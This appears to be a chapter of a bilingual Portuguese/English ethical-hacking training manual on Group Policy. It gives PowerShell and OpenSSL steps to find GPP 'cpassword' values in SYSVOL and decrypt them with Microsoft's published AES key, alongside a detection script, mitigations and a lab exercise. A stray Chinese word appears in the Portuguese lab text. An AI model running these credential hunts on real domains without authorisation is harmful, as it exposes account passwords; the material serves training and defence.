@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cap. 28 — Group Policy Basics | Ch. 28</title>
+<style>
+:root{--bg:#0d1117;--bg2:#161b22;--bg3:#1c2128;--fg:#c9d1d9;--fg2:#8b949e;--accent:#39d353;--accent2:#58a6ff;--warn:#d29922;--danger:#f85149;--border:#30363d;--code-bg:#0b0f14;--code-fg:#7ee787}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--fg);font-family:"Segoe UI",Roboto,Helvetica,Arial,sans-serif;line-height:1.65;font-size:16px}
+header{background:linear-gradient(135deg,#0d1117 0%,#161b22 100%);border-bottom:2px solid var(--accent2);padding:2rem 1.5rem 1.5rem}
+header h1{margin:0 0 .3rem;font-size:1.9rem;color:var(--accent2)}
+header .sub{color:var(--fg2);font-size:.95rem}
+header .meta{margin-top:.8rem;font-size:.85rem;color:var(--fg2)}
+header .meta span{margin-right:1.2rem}
+nav.toc{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1rem 1.2rem;margin:1.5rem auto;max-width:1100px}
+nav.toc h2{margin:0 0 .6rem;font-size:1rem;color:var(--accent2);text-transform:uppercase;letter-spacing:.05em}
+nav.toc ol{margin:0;padding-left:1.3rem;columns:2;column-gap:2rem}
+nav.toc a{color:var(--fg);text-decoration:none}
+nav.toc a:hover{color:var(--accent2)}
+main{max-width:1100px;margin:0 auto;padding:0 1.5rem 3rem}
+section{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1.4rem 1.6rem;margin:1.5rem 0}
+section h2{margin-top:0;color:var(--accent2);font-size:1.3rem;border-bottom:1px solid var(--border);padding-bottom:.5rem}
+section h3{color:var(--accent);font-size:1.05rem;margin-top:1.4rem}
+.lang{display:block;margin:.4rem 0}
+.lang .pt::before{content:"🇵🇹 PT ";color:var(--accent);font-weight:600;font-size:.8rem}
+.lang .en::before{content:"🇬🇧 EN ";color:var(--accent2);font-weight:600;font-size:.8rem}
+.lang .pt,.lang .en{display:block;margin:.25rem 0}
+pre{background:var(--code-bg);border:1px solid var(--border);border-left:3px solid var(--accent);border-radius:6px;padding:1rem 1.1rem;overflow-x:auto;font-family:"Cascadia Code","Fira Code",Consolas,monospace;font-size:.88rem;color:var(--code-fg);line-height:1.5}
+code.inline{background:var(--bg3);border:1px solid var(--border);border-radius:4px;padding:.1rem .4rem;font-family:Consolas,monospace;font-size:.88rem;color:var(--accent)}
+table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:.92rem}
+th,td{border:1px solid var(--border);padding:.55rem .7rem;text-align:left;vertical-align:top}
+th{background:var(--bg3);color:var(--accent2)}
+tr:nth-child(even) td{background:rgba(255,255,255,.02)}
+.callout{border-left:4px solid var(--warn);background:rgba(210,153,34,.08);padding:.8rem 1rem;border-radius:0 6px 6px 0;margin:1rem 0}
+.callout.danger{border-left-color:var(--danger);background:rgba(248,81,73,.08)}
+.callout.info{border-left-color:var(--accent2);background:rgba(88,166,255,.08)}
+.callout strong{color:var(--fg)}
+.badge{display:inline-block;font-size:.7rem;font-weight:700;letter-spacing:.05em;padding:.15rem .5rem;border-radius:999px;margin-left:.4rem;vertical-align:middle}
+.badge.orig{background:rgba(88,166,255,.15);color:var(--accent2);border:1px solid var(--accent2)}
+.badge.comp{background:rgba(57,211,83,.12);color:var(--accent);border:1px solid var(--accent)}
+.badge.impact{background:rgba(248,81,73,.12);color:var(--danger);border:1px solid var(--danger)}
+ul.checklist{list-style:none;padding-left:0}
+ul.checklist li::before{content:"☐ ";color:var(--accent);font-weight:700;margin-right:.3rem}
+footer{border-top:1px solid var(--border);margin-top:3rem;padding:1.5rem;text-align:center;color:var(--fg2);font-size:.85rem}
+footer a{color:var(--accent2);text-decoration:none}
+@media (max-width:720px){nav.toc ol{columns:1}header h1{font-size:1.4rem}}
+</style>
+</head>
+<body>
+<header>
+<h1>Cap. 28 — Group Policy Basics</h1>
+<div class="sub">Ch. 28 — Pentesting Group Policy for Hackers</div>
+<div class="meta"><span>📖 Manual de Formação Ethical Hacker</span><span>🎯 Nível: Intermédio / AD</span></div>
+</header>
+<nav class="toc">
+<h2>Índice / Table of Contents</h2>
+<ol>
+<li><a href="#obj">Objetivos</a></li><li><a href="#ctx">Contexto</a></li>
+<li><a href="#gpozar">GPOZaurr</a></li><li><a href="#links">Links e OUs</a></li>
+<li><a href="#files">SYSVOL Files</a></li><li><a href="#cpassword">cpassword</a></li>
+<li><a href="#decrypt">Desencriptação</a></li><li><a href="#impact">Scripts de Impacto</a></li>
+<li><a href="#mitre">MITRE</a></li><li><a href="#mitig">Mitigações</a></li>
+<li><a href="#lab">Laboratório</a></li><li><a href="#revq">Revisão</a></li>
+<li><a href="#sum">Resumo</a></li>
+</ol>
+</nav>
+<main>
+
+<section id="obj">
+<h2>1. Objetivos de Aprendizagem / Learning Objectives</h2>
+<div class="lang">
+<span class="pt">Compreender o que são GPOs e como se enumeram com GPOZaurr; identificar GPOs vazios, não ligados e desativados; mapear links para OUs de alto valor (Domain Controllers); listar ficheiros no SYSVOL; encontrar <code class="inline">Groups.xml</code> com <code class="inline">cpassword</code>; desencriptar passwords GPP com a chave AES pública da Microsoft (MS14-025); <strong>construir scripts de impacto nativos</strong> para validação e deteção.</span>
+<span class="en">Understand what GPOs are and how to enumerate them with GPOZaurr; identify empty, unlinked, and disabled GPOs; map links to high-value OUs (Domain Controllers); list files in SYSVOL; find <code class="inline">Groups.xml</code> with <code class="inline">cpassword</code>; decrypt GPP passwords with Microsoft's public AES key (MS14-025); <strong>build native impact scripts</strong> for validation and detection.</span>
+</div>
+</section>
+
+<section id="ctx">
+<h2>2. Contexto e Relevância / Context and Relevance <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">Um GPO que não está ligado a nada não afeta computadores, mas o objeto e o SYSVOL por trás dele continuam a existir. É aí que <code class="inline">Groups.xml</code> antigos e scripts esquecidos ficam à espera de ser encontrados. Mesmo GPOs desativados ou não ligados podem conter credenciais que já foram usadas em algum momento e que continuam válidas. O SYSVOL é legível por qualquer utilizador autenticado no domínio — é por design, mas significa que qualquer segredo lá deixado é acessível a todos.</span>
+<span class="en">A GPO that isn't linked to anything doesn't affect computers, but the object and the SYSVOL behind it still exist. That's where old <code class="inline">Groups.xml</code> files and forgotten scripts sit around waiting to be found. Even disabled or unlinked GPOs can contain credentials that were used at some point and are still valid. SYSVOL is readable by any authenticated domain user — that's by design, but it means any secret left there is accessible to everyone.</span>
+</div>
+</section>
+
+<section id="gpozar">
+<h2>3. GPOZaurr — Enumeração de GPOs <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">O módulo GPOZaurr permite enumerar todos os GPOs do domínio e ver o seu estado: <code class="inline">Empty</code> (sem definições), <code class="inline">Linked</code> (ligado a algo) e <code class="inline">Enabled</code> (ativo). Um GPO pode ter definições mas não estar ligado a nada — não faz nada, mas o objeto e o SYSVOL persistem.</span>
+<span class="en">The GPOZaurr module lets you enumerate all GPOs in the domain and see their status: <code class="inline">Empty</code> (no settings), <code class="inline">Linked</code> (linked to something), and <code class="inline">Enabled</code> (active). A GPO can have settings but not be linked to anything — it does nothing, but the object and SYSVOL persist.</span>
+</div>
+<pre>PS > Import-Module GPOZaurr
+PS > Get-GPOZaurr | Format-Table DisplayName, DomainName, Empty, Linked, Enabled -AutoSize</pre>
+</section>
+
+<section id="links">
+<h2>4. Links e OUs de Alto Valor <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">Um GPO só afeta computadores se estiver ligado a um domínio, site ou OU. O <code class="inline">Get-GPOZaurrLink</code> mostra onde cada GPO está ligado. O Domain Controllers OU é o alvo de maior valor — um GPO ligado aí pode afetar todos os DCs.</span>
+<span class="en">A GPO only affects computers if it's linked to a domain, site, or OU. <code class="inline">Get-GPOZaurrLink</code> shows where each GPO is linked. The Domain Controllers OU is the highest-value target — a GPO linked there can affect all DCs.</span>
+</div>
+<pre>PS > Get-GPOZaurrLink | Format-Table DisplayName, CanonicalName, Enabled, Enforced -AutoSize</pre>
+<div class="lang">
+<span class="pt">Para listar os computadores numa OU específica:</span>
+<span class="en">To list computers in a specific OU:</span>
+</div>
+<pre>PS > Get-ADComputer -SearchBase "OU=Workstations-Temp,DC=sekvoya,DC=local" -Filter * | Select-Object Name, DistinguishedName</pre>
+</section>
+
+<section id="files">
+<h2>5. Listar Ficheiros no SYSVOL <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">O <code class="inline">Get-GPOZaurrFiles</code> não consulta o AD — lista a árvore real da pasta Policies no SYSVOL. É aqui que encontras <code class="inline">Groups.xml</code> com <code class="inline">cpassword</code>, <code class="inline">logon.bat</code>, e templates ADM esquecidos. Qualquer utilizador de domínio pode abrir estas pastas no Explorer.</span>
+<span class="en"><code class="inline">Get-GPOZaurrFiles</code> doesn't query AD — it lists the actual Policies folder tree in SYSVOL. This is where you find <code class="inline">Groups.xml</code> with <code class="inline">cpassword</code>, <code class="inline">logon.bat</code>, and forgotten ADM templates. Any domain user can open these folders in Explorer.</span>
+</div>
+<pre>PS > Get-GPOZaurrFiles | Format-Table GPOName, FullName, Length -AutoSize</pre>
+</section>
+
+<section id="cpassword">
+<h2>6. cpassword — O Clássico GPP Password <span class="badge orig">Original</span> <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt">O Group Policy Preferences (GPP) permitia aos administradores definir passwords de contas locais via SYSVOL. Essas passwords eram guardadas em XML (`Groups.xml`, `Services.xml`, `ScheduledTasks.xml`, etc.) encriptadas com AES-256, mas a Microsoft publicou a chave em 2012. Qualquer utilizador de domínio com acesso de leitura ao SYSVOL pode desencriptar o valor <code class="inline">cpassword</code>.</span>
+<span class="en">Group Policy Preferences (GPP) allowed administrators to set local account passwords via SYSVOL. Those passwords were stored in XML (`Groups.xml`, `Services.xml`, `ScheduledTasks.xml`, etc.) encrypted with AES-256, but Microsoft published the key in 2012. Any domain user with read access to SYSVOL can decrypt the <code class="inline">cpassword</code> value.</span>
+</div>
+<h3>6.1 Encontrar cpassword / Find cpassword</h3>
+<pre>PS > findstr /S /I cpassword \\DOMAIN\SYSVOL\DOMAIN\policies\*.xml</pre>
+<div class="lang">
+<span class="pt">Ou em PowerShell nativo:</span>
+<span class="en">Or in native PowerShell:</span>
+</div>
+<pre>PS > Get-ChildItem \\DOMAIN\SYSVOL\ -Recurse -Include *.xml | Select-String cpassword</pre>
+</section>
+
+<section id="decrypt">
+<h2>7. Desencriptação de cpassword <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt">A chave AES é pública. Podes desencriptar com OpenSSL, <code class="inline">gpp-decrypt</code>, ou o módulo <code class="inline">Get-GPPPassword</code> do PowerSploit.</span>
+<span class="en">The AES key is public. You can decrypt with OpenSSL, <code class="inline">gpp-decrypt</code>, or PowerSploit's <code class="inline">Get-GPPPassword</code> module.</span>
+</div>
+<pre># Com OpenSSL
+echo 'CPASSWORD_BASE64' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000
+
+# Com PowerSploit
+PS > Import-Module .\Get-GPPPassword.ps1
+PS > Get-GPPPassword</pre>
+</section>
+
+<section id="impact">
+<h2>8. Scripts de Impacto / Impact Scripts <span class="badge impact">Impacto</span> <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt">Os scripts abaixo consolidam a enumeração de GPOs e a caça a cpassword.</span>
+<span class="en">The scripts below consolidate GPO enumeration and cpassword hunting.</span>
+</div>
+
+<h3>8.1 Script 28.1 — Enumeração de GPOs / GPO Enumeration</h3>
+<pre># Script 28.1 - GPO Enumeration
+$out = ".\gpo-enum.csv"
+Import-Module GPOZaurr -EA SilentlyContinue
+if (Get-Command Get-GPOZaurr -EA SilentlyContinue) {
+  Get-GPOZaurr | Select-Object DisplayName, DomainName, Empty, Linked, Enabled |
+    Export-Csv $out -NoTypeInformation -Encoding UTF8
+  Write-Host "[+] GPOs enumerated -> $out" -ForegroundColor Green
+} else {
+  Write-Host "[!] GPOZaurr module not available" -ForegroundColor Yellow
+}</pre>
+
+<h3>8.2 Script 28.2 — Caça a cpassword no SYSVOL / cpassword Hunt</h3>
+<pre># Script 28.2 - cpassword Hunt
+param([string]$Domain = $env:USERDNSDOMAIN)
+$out = ".\cpassword-hunt.csv"
+$sysvol = "\\$Domain\SYSVOL\$Domain\Policies"
+$hits = @()
+if (Test-Path $sysvol) {
+  Get-ChildItem $sysvol -Recurse -Include *.xml -EA SilentlyContinue |
+    ForEach-Object {
+      $content = Get-Content $_.FullName -Raw
+      if ($content -match "cpassword") {
+        $hits += [PSCustomObject]@{ File=$_.FullName; Contains="cpassword" }
+      }
+    }
+}
+$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
+Write-Host "[+] cpassword files: $($hits.Count) -> $out" -ForegroundColor Red
+$hits | Format-Table -AutoSize</pre>
+
+<h3>8.3 Script 28.3 — Desencriptação GPP em PowerShell / GPP Decryption</h3>
+<pre># Script 28.3 - GPP Decryption (reference)
+param([string]$Cpassword)
+$AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
+$AesIV = New-Object Byte[]($AesKey.Length)
+$Aes = [System.Security.Cryptography.Aes]::Create()
+$Aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+$Aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+$Aes.Key = $AesKey
+$Aes.IV = $AesIV
+$Decryptor = $Aes.CreateDecryptor()
+$EncryptedBytes = [System.Convert]::FromBase64String($Cpassword)
+$DecryptedBytes = $Decryptor.TransformFinalBlock($EncryptedBytes, 0, $EncryptedBytes.Length)
+[System.Text.Encoding]::Unicode.GetString($DecryptedBytes).TrimEnd([char]0)</pre>
+
+<h3>8.4 Script 28.4 — Deteção de Leitura Massiva do SYSVOL / Mass SYSVOL Read Detection</h3>
+<pre># Script 28.4 - Mass SYSVOL Read Detection (heuristic)
+$out = ".\sysvol-read-detect.csv"
+$hits = @()
+Get-WinEvent -LogName Security -MaxEvents 3000 -EA SilentlyContinue |
+  Where-Object { $_.Id -eq 5145 } | ForEach-Object {
+    $xml = [xml]$_.ToXml()
+    $share = ($xml.Event.EventData.Data | Where-Object Name -eq "ShareName").'#text'
+    $file  = ($xml.Event.EventData.Data | Where-Object Name -eq "RelativeTargetName").'#text'
+    if ($share -match "SYSVOL" -and $file -match "\.xml$") {
+      $hits += [PSCustomObject]@{ Time=$_.TimeCreated; File=$file }
+    }
+  }
+$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
+Write-Host "[+] SYSVOL XML reads: $($hits.Count) -> $out" -ForegroundColor Yellow</pre>
+</section>
+
+<section id="mitre">
+<h2>9. Mapeamento MITRE ATT&amp;CK <span class="badge comp">Complementar</span></h2>
+<table>
+<tr><th>Técnica</th><th>ID</th><th>Onde</th></tr>
+<tr><td>Unsecured Credentials: Group Policy Preferences</td><td>T1552.006</td><td>cpassword </td></tr>
+<tr><td>Domain Policy Modification: Group Policy Modification</td><td>T1484.001</td><td>GPO links e SYSVOL </td></tr>
+</table>
+</section>
+
+<section id="mitig">
+<h2>10. Mitigações Blue Team / Mitigations <span class="badge comp">Complementar</span></h2>
+<ol>
+<li><strong>Procurar e remover cpassword</strong> do SYSVOL — Script 28.2.</li>
+<li><strong>Aplicar MS14-025</strong> — impede a criação de novos cpassword.</li>
+<li><strong>Rotacionar passwords</strong> que estiveram em SYSVOL — assumir comprometidas.</li>
+<li><strong>Auditar acessos massivos ao SYSVOL</strong> — Script 28.4.</li>
+<li><strong>Usar LAPS</strong> para passwords de admin local em vez de GPP.</li>
+<li><strong>Remover GPOs órfãos</strong> (não ligados) e limpar SYSVOL.</li>
+</ol>
+</section>
+
+<section id="lab">
+<h2>11. Exercício de Laboratório / Lab Exercise <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt"><strong>Cenário:</strong> DC Windows Server + VM cliente加入 ao domínio. Snapshot antes. Criar um <code class="inline">Groups.xml</code> de teste com <code class="inline">cpassword</code> no SYSVOL. <strong>Objetivo:</strong> enumerar GPOs, encontrar cpassword, desencriptar e correr deteções.</span>
+<span class="en"><strong>Scenario:</strong> Windows Server DC + domain-joined client VM. Snapshot before. Create a test <code class="inline">Groups.xml</code> with <code class="inline">cpassword</code> in SYSVOL. <strong>Goal:</strong> enumerate GPOs, find cpassword, decrypt, and run detections.</span>
+</div>
+<table>
+<tr><th>#</th><th>Tarefa</th><th>Comando</th><th>Evidência</th></tr>
+<tr><td>1</td><td>Importar GPOZaurr</td><td><code class="inline">Import-Module GPOZaurr</code></td><td>Módulo carregado</td></tr>
+<tr><td>2</td><td>Enumerar GPOs</td><td><code class="inline">Get-GPOZaurr</code></td><td><code class="inline">gpo-enum.csv</code></td></tr>
+<tr><td>3</td><td>Ver links</td><td><code class="inline">Get-GPOZaurrLink</code></td><td>Output</td></tr>
+<tr><td>4</td><td>Listar ficheiros</td><td><code class="inline">Get-GPOZaurrFiles</code></td><td>Output</td></tr>
+<tr><td>5</td><td>Caçar cpassword</td><td><code class="inline">.\cpassword-hunt.ps1</code></td><td><code class="inline">cpassword-hunt.csv</code></td></tr>
+<tr><td>6</td><td>Desencriptar</td><td><code class="inline">.\gpp-decrypt.ps1 -Cpassword "..."</code></td><td>Password em claro</td></tr>
+<tr><td>7</td><td>Deteção SYSVOL</td><td><code class="inline">.\sysvol-read-detect.ps1</code></td><td><code class="inline">sysvol-read-detect.csv</code></td></tr>
+</table>
+<h3>Checklist de evidências / Evidence checklist</h3>
+<ul class="checklist">
+<li>Snapshot inicial</li>
+<li><code class="inline">gpo-enum.csv</code></li>
+<li>Output <code class="inline">Get-GPOZaurrLink</code></li>
+<li><code class="inline">cpassword-hunt.csv</code></li>
+<li>Password desencriptada</li>
+<li><code class="inline">sysvol-read-detect.csv</code></li>
+<li>Snapshot final</li>
+</ul>
+</section>
+
+<section id="revq">
+<h2>12. Perguntas de Revisão / Review Questions <span class="badge comp">Complementar</span></h2>
+<ol>
+<li>Porque é que um GPO não ligado ainda é perigoso? / Why is an unlinked GPO still dangerous? </li>
+<li>O que mostra o <code class="inline">Get-GPOZaurrLink</code>? / What does <code class="inline">Get-GPOZaurrLink</code> show? </li>
+<li>Porque é que o SYSVOL é legível por qualquer utilizador? / Why is SYSVOL readable by any user? </li>
+<li>O que é o cpassword e porque é desencriptável? / What is cpassword and why is it decryptable? </li>
+<li>Qual é a chave AES pública da Microsoft? / What is Microsoft's public AES key? </li>
+<li>Como se mitiga o risco de cpassword? / How to mitigate cpassword risk? </li>
+<li>Porque é que LAPS é preferível a GPP para passwords locais? / Why is LAPS preferable to GPP for local passwords? </li>
+</ol>
+</section>
+
+<section id="sum">
+<h2>13. Resumo do Capítulo / Chapter Summary</h2>
+<div class="lang">
+<span class="pt">Este capítulo cobriu o Group Policy Basics: enumeração de GPOs com GPOZaurr (<code class="inline">Get-GPOZaurr</code>, <code class="inline">Get-GPOZaurrLink</code>, <code class="inline">Find-GPO</code>, <code class="inline">Get-GPOZaurrFiles</code>), a importância de GPOs órfãos e desativados (o objeto e SYSVOL persistem), e a caça a <code class="inline">cpassword</code> em <code class="inline">Groups.xml</code> e ficheiros similares no SYSVOL. A chave AES é pública (MS14-025), pelo que qualquer utilizador de domínio pode desencriptar as passwords. Acrescentámos <strong>quatro scripts de impacto</strong> (enumeração de GPOs, caça a cpassword, desencriptação, deteção de leitura massiva do SYSVOL) que consolidam a recolha e ajudam o blue team. O Cap. 29 entra no Backdooring Installers with DFMI.</span>
+<span class="en">This chapter covered Group Policy Basics: GPO enumeration with GPOZaurr (<code class="inline">Get-GPOZaurr</code>, <code class="inline">Get-GPOZaurrLink</code>, <code class="inline">Find-GPO</code>, <code class="inline">Get-GPOZaurrFiles</code>), the importance of orphaned and disabled GPOs (the object and SYSVOL persist), and hunting <code class="inline">cpassword</code> in <code class="inline">Groups.xml</code> and similar files in SYSVOL. The AES key is public (MS14-025), so any domain user can decrypt the passwords. We added <strong>four impact scripts</strong> (GPO enumeration, cpassword hunt, decryption, mass SYSVOL read detection) that consolidate collection and help the blue team. Ch. 29 moves into Backdooring Installers with DFMI.</span>
+</div>
+</section>
+
+</main>
+<footer>
+<div>Manual de Formação Ethical Hacker — Cap. 28 / Ethical Hacker Training Manual — Ch. 28</div>
+<div style="margin-top:.6rem">
+<a href="cap27.html">← Cap. anterior / Previous</a> &nbsp;|&nbsp;
+<a href="#">Índice / Index</a> &nbsp;|&nbsp;
+<a href="cap29.html">Cap. seguinte / Next →</a>
+</div>
+</footer>
+</body>
+</html>
